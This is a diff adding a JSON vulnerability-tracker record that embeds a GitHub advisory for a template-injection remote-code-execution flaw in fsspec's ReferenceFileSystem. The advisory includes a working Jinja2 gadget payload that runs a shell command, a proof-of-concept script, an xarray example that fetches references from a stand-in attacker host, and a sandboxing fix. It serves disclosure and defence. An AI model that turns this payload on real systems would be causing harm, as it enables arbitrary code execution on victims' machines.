@@ -1,0 +1,60 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 11, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/16906899?v=4\", \"events_url\": \"https://api.github.com/users/DanyAssuid/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/DanyAssuid/followers\", \"following_url\": \"https://api.github.com/users/DanyAssuid/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/DanyAssuid/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/DanyAssuid\", \"id\": 16906899, \"login\": \"DanyAssuid\", \"node_id\": \"MDQ6VXNlcjE2OTA2ODk5\", \"organizations_url\": \"https://api.github.com/users/DanyAssuid/orgs\", \"received_events_url\": \"https://api.github.com/users/DanyAssuid/received_events\", \"repos_url\": \"https://api.github.com/users/DanyAssuid/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/DanyAssuid/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/DanyAssuid/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/DanyAssuid\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-104851\", \"cvss\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-94\", \"name\": \"Improper Control of Generation of Code ('Code Injection')\"}, {\"cwe_id\": \"CWE-1336\", \"name\": \"Improper Neutralization of Special Elements Used in a Template Engine\"}], \"description\": \"### Summary\\n\\n`fsspec.implementations.reference.ReferenceFileSystem` parses a \\\"references\\\"\\nJSON document (Kerchunk format) supplied either inline or via a URL. The\\nparser renders fields from this JSON through **un-sandboxed**\\n`jinja2.Template(...).render(...)` calls in three locations. An attacker who\\ncontrols the JSON document — typically by hosting it at a URL that the\\nvictim opens with `fsspec.filesystem(\\\"reference\\\", fo=URL)` or via\\n`xarray.open_dataset(\\\"reference://...\\\")` — achieves arbitrary Python code\\nexecution on the victim machine, before any data is read.\\n\\nThis mirrors the pattern of [CVE-2024-34359](https://nvd.nist.gov/vuln/detail/CVE-2024-34359)\\nin `llama-cpp-python`, where externally-sourced template strings were\\nrendered with the default unrestricted Jinja2 environment.\\n\\n### Affected versions\\n\\nAll versions of `fsspec` from `0.9.0` onward (vulnerable code introduced in\\ncommit `0fb8d56b684ee74ad9ad4587fd560bde1b116450`, 2021-03-12). Confirmed on\\nthe latest released version `2025.10.0`.\\n\\n### Affected sinks\\n\\nAll in `fsspec/implementations/reference.py`:\\n\\n| Sink | Location | Trigger |\\n|---|---|---|\\n| A — `_process_references1._render_jinja` | lines 1016-1018 | `simple_templates=False` and a `refs` entry contains `{{` |\\n| B — `_process_templates` (lambda) | lines 1043-1053 | `templates` dict has values containing `{{`, invoked later via render context |\\n| C — `_process_gen` | lines 1075-1083 | references JSON contains a `gen` array (always reached, regardless of `simple_templates`) |\\n\\nSink C is the most severe: it is reached unconditionally for any references\\nJSON that includes a `gen` field.\\n\\nThe vulnerable code:\\n\\n```python\\n# fsspec/implementations/reference.py\\n# Sink A\\n@lru_cache(1000)\\ndef _render_jinja(u):\\n    return jinja2.Template(u).render(**self.templates)  # <- unsandboxed\\n\\n# Sink B\\ndef _process_templates(self, tmp):\\n    ...\\n    for k, v in tmp.items():\\n        if \\\"{{\\\" in v:\\n            import jinja2\\n            self.templates[k] = lambda temp=v, **kwargs: jinja2.Template(\\n                temp                                       # <- unsandboxed\\n            ).render(**kwargs)\\n\\n# Sink C\\ndef _process_gen(self, gens):\\n    ...\\n    for pr in products:\\n        import jinja2\\n        key = jinja2.Template(gen[\\\"key\\\"]).render(**pr, **self.templates)        # <- unsandboxed\\n        url = jinja2.Template(gen[\\\"url\\\"]).render(**pr, **self.templates)        # <- unsandboxed\\n        if (\\\"offset\\\" in gen) and (\\\"length\\\" in gen):\\n            offset = int(jinja2.Template(gen[\\\"offset\\\"]).render(...))            # <- unsandboxed\\n            length = int(jinja2.Template(gen[\\\"length\\\"]).render(...))            # <- unsandboxed\\n```\\n\\n### Proof of concept (Sink C, minimal)\\n\\nSave as `poc.py`:\\n\\n```python\\nimport http.server, json, socketserver, threading, time, fsspec\\nfrom pathlib import Path\\n\\nPAYLOAD = \\\"{{ joiner.__init__.__globals__.os.popen('touch /tmp/fsspec_pwned_$(whoami)').read() }}\\\"\\nREF = {\\n    \\\"version\\\": 1, \\\"templates\\\": {}, \\\"refs\\\": {\\\"x\\\": \\\"x\\\"},\\n    \\\"gen\\\": [{\\n        \\\"key\\\": PAYLOAD + \\\"/{{ i }}\\\", \\\"url\\\": \\\"http://example.com/{{ i }}\\\",\\n        \\\"offset\\\": \\\"0\\\", \\\"length\\\": \\\"0\\\", \\\"dimensions\\\": {\\\"i\\\": [0]},\\n    }],\\n}\\n\\nbody = json.dumps(REF).encode()\\nclass H(http.server.BaseHTTPRequestHandler):\\n    def do_GET(self):\\n        self.send_response(200); self.end_headers(); self.wfile.write(body)\\n    def log_message(self, *a, **kw): pass\\n\\nsrv = socketserver.TCPServer((\\\"127.0.0.1\\\", 0), H)\\nthreading.Thread(target=srv.serve_forever, daemon=True).start()\\nurl = f\\\"http://127.0.0.1:{srv.server_address[1]}/refs.json\\\"\\n\\nfor p in Path(\\\"/tmp\\\").glob(\\\"fsspec_pwned_*\\\"): p.unlink()\\ntry:\\n    fsspec.filesystem(\\\"reference\\\", fo=url)\\nexcept Exception as e:\\n    print(\\\"exception:\\\", e)\\nsrv.shutdown()\\ntime.sleep(0.3)\\nprint(\\\"markers:\\\", list(Path(\\\"/tmp\\\").glob(\\\"fsspec_pwned_*\\\")))\\n```\\n\\nRun:\\n\\n```\\npip install fsspec aiohttp requests jinja2\\npython3 poc.py\\n# → markers: [PosixPath('/tmp/fsspec_pwned_<user>')]\\n```\\n\\n### End-to-end via xarray (real-world consumer pathway)\\n\\n```python\\nimport xarray as xr\\nds = xr.open_dataset(\\n    \\\"reference://\\\",\\n    engine=\\\"zarr\\\",\\n    backend_kwargs={\\n        \\\"consolidated\\\": False,\\n        \\\"storage_options\\\": {\\n            \\\"fo\\\": \\\"http://attacker.example/refs.json\\\",\\n            \\\"remote_protocol\\\": \\\"http\\\",\\n        },\\n    },\\n)\\n# RCE fires before any data is materialised.\\n```\\n\\n### Tested on\\n\\n- fsspec 2025.10.0, jinja2 3.1.6, Python 3.9, macOS 14\\n- fsspec 2025.10.0, jinja2 3.1.6, Python 3.12-slim, Docker Linux\\n\\n### Impact\\n\\n`fsspec.ReferenceFileSystem` is the canonical entrypoint for the **Kerchunk**\\nformat, widely used in the Pangeo / Earth-observation / climate\\ndata-science ecosystem to provide cloud-optimised views of\\nHDF5 / NetCDF / GRIB archives hosted on object storage.\\n\\nRealistic attack vectors:\\n\\n- A user opens a community-shared Kerchunk catalogue link via xarray/dask.\\n- A managed data-science platform (notebook server, batch job runner)\\n  ingests user-submitted Kerchunk URLs.\\n- A workflow downloads a catalogue from a bucket whose contents have\\n  been tampered with (supply chain).\\n\\nIn every case, the victim performs no action beyond opening a \\\"reference\\nfilesystem\\\" — there is no documented expectation that a data catalogue\\ncan execute arbitrary Python code.\\n\\n### Suggested fix\\n\\nReplace `jinja2.Template(...)` with a shared\\n`jinja2.sandbox.ImmutableSandboxedEnvironment` for all three sinks. This\\nmatches the post-incident hardening applied to `llama-cpp-python` after\\nCVE-2024-34359.\\n\\n```python\\n# At module top\\ndef _sandboxed_env():\\n    import jinja2.sandbox\\n    env = getattr(_sandboxed_env, \\\"_env\\\", None)\\n    if env is None:\\n        env = jinja2.sandbox.ImmutableSandboxedEnvironment()\\n        _sandboxed_env._env = env\\n    return env\\n```\\n\\nThen in each sink, replace `jinja2.Template(s).render(...)` with\\n`_sandboxed_env().from_string(s).render(...)`.\\n\\nThe legitimate Kerchunk template syntax (simple variable substitution\\nlike `{{ varname }}`) continues to work under the sandbox; only the SSTI\\ngadgets (`__class__`, `__init__.__globals__`, `__subclasses__`, etc.)\\nare refused with `jinja2.exceptions.SecurityError`.\\n\\nA complete patch is available on request.\\n\\n### Credit\\n\\nReported by Dany.A\", \"epss\": {\"percentage\": 0.00317, \"percentile\": 0.22438}, \"ghsa_id\": \"GHSA-27vj-qcqg-25rc\", \"github_reviewed_at\": \"2026-10-05T22:53:22Z\", \"html_url\": \"https://github.com/advisories/GHSA-27vj-qcqg-25rc\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-27vj-qcqg-25rc\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-104851\"}], \"nvd_published_at\": \"2026-10-02T17:17:03Z\", \"published_at\": \"2026-10-05T22:53:22Z\", \"references\": [\"https://github.com/fsspec/filesystem_spec/security/advisories/GHSA-27vj-qcqg-25rc\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-104851\", \"https://github.com/fsspec/filesystem_spec/pull/2029\", \"https://github.com/fsspec/filesystem_spec/pull/2039\", \"https://github.com/fsspec/filesystem_spec/commit/86438783f93b1398ef245b92f0e6063b445b611c\", \"https://github.com/fsspec/filesystem_spec/commit/a1c16ab3f07f354aa371c38f7b1b07ea7fd4c5c8\", \"https://github.com/fsspec/filesystem_spec/releases/tag/2026.6.0\", \"https://github.com/advisories/GHSA-27vj-qcqg-25rc\"], \"repository_advisory_url\": \"https://api.github.com/repos/fsspec/filesystem_spec/security-advisories/GHSA-27vj-qcqg-25rc\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/fsspec/filesystem_spec\", \"summary\": \"fsspec: Server-Side Template Injection in ReferenceFileSystem leads to Remote Code Execution\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-05T22:53:23Z\", \"url\": \"https://api.github.com/advisories/GHSA-27vj-qcqg-25rc\", \"vulnerabilities\": [{\"first_patched_version\": \"2026.6.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"fsspec\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 0.9.0, < 2026.6.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-27vj-qcqg-25rc",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "fsspec: >= 0.9.0, < 2026.6.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2024-34359",
+      "CVE-2026-104851"
+    ],
+    "cvss_score": 8.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "fsspec"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-10-06T19:13:48.855195Z",
+  "provenance": {
+    "content_sha256": "6656e2b2fe5387b8ea264e03b1b7b2c7ccc8506700018717d189a5a61ead76a2",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-05T22:53:22Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-27vj-qcqg-25rc",
+  "status": "active",
+  "title": "fsspec: Server-Side Template Injection in ReferenceFileSystem leads to Remote Code Execution",
+  "updated_at": "2026-10-05T22:53:23Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-27vj-qcqg-25rc"
+}
